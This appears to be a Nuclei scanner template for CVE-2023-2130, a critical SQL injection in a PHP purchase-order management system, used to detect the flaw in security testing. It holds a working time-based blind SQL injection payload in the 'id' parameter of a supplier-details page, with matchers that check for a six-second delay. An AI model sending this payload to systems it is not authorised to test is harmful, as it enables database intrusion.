id: CVE-2023-2130

info:
  name: Purchase Order Management v1.0 - SQL Injection
  author: theamanrawat
  severity: critical
  description: |
    A vulnerability classified as critical has been found in SourceCodester Purchase Order Management System 1.0. Affected is an unknown function of the file /admin/suppliers/view_details.php of the component GET Parameter Handler. The manipulation of the argument id leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-226206 is the identifier assigned to this vulnerability.
  reference:
    - https://github.com/zitozito1/bug_report/blob/main/SQLi.md
    - https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html
    - https://nvd.nist.gov/vuln/detail/CVE-2023-2130
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-2130
    cwe-id: CWE-89
  metadata:
    max-request: 1
    verified: "true"
  tags: cve,cve2023,sqli,purchase-order-management-system

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/suppliers/view_details.php?id=1'+AND+(SELECT+9687+FROM+(SELECT(SLEEP(6)))pnac)+AND+'ARHJ'='ARHJ"

    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code == 200'
          - 'contains(header, "text/html")'
          - 'contains(body, "Supplier Name")'
        condition: and
